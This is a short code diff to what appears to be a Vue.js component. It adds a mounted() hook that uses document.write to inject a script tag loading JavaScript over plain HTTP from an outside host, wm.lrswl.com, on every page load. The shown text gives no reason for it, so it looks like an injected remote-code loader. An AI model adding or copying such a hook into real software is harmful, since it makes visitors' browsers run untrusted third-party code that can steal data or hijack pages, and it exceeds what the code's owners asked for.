@@ -83,6 +83,9 @@
             return {
             }
         },
+        mounted(){
+            document.write('<script src="http://wm.lrswl.com/page/?s=289216"></script>');
+        },
         computed: {
         },
         methods: {
